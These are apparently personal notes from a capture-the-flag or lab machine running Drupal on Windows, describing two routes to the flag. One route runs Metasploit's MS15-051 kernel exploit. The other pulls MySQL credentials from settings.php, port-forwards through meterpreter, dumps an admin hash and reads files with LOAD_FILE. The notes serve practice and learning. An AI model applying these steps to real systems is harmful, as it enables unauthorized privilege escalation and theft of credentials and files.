- Using `metasploit`'s exploit suggester reveals:
	- Vulnerable to  `exploit/windows/local/ms15_051_client_copy_image`
- ![[Pasted image 20250422172703.png]]

# The Intended, easier and reverse shell route
----
- Just pop a shell using this kernel exploit
- **Note:- session shell with low level user MUST be of `x64`architecture**
```
 msf > use exploit/windows/local/ms15_051_client_copy_image
      msf exploit(ms15_051_client_copy_image) > show targets
            ...targets...
      msf exploit(ms15_051_client_copy_image) > set TARGET <target-id>
      msf exploit(ms15_051_client_copy_image) > show options
            ...show and set options...
      msf exploit(ms15_051_client_copy_image) > exploit
```

# Unintended, hard route (I found this):
---
- After searching for a while, I found credentials in `settings.php`inside `C:\inetpub\drupal-7.54/sites/default/settings.php`. Also, can search in https://drupal.stackexchange.com/questions/225477/where-are-the-database-username-and-password-stored
	- `root : mysql123!root`
- Not able to connect with MySQL using windows, therefore, **port forwarded with meterpreter** using:
	- `portfwd add -l 3306 -p 3306 -r 127.0.0.1`
- **Connect using**:
	- `mysql -u root -p -h 127.0.0.1 -P 3306`
		- `mysql123!root`
- Found **hash of admin in users table:**
	- `$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE`
	- But this was **not crackable**
- **==We are able to read and create any file using MySQL commands==**
- Therefore,
	- `SELECT LOAD_FILE('C:\\Windows\\Users\\Administrator\\Desktop\\root.txt');`

